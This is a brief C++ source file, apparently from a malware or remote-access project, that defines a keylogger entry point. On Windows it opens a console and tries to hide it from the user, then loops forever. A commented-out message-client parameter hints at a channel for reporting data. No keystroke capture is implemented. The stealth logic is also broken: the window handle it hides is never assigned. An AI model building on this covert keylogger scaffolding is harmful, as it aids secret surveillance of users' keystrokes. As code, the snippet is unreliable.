#if defined(_WIN64) || defined(_WIN32)
#include <windows.h>
#include <winuser.h>
#endif

#include "keylogger.hpp"
#include "../core/debug.hpp"

void startKeylogger(/* AmqpClient &amqpClient */) {
#if defined(_WIN64) || defined(_WIN32)
    HWND stealth;
    AllocConsole();
    FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    while (true) {}
#else
    throw "Key logger is not supported fro this operating system";
#endif
}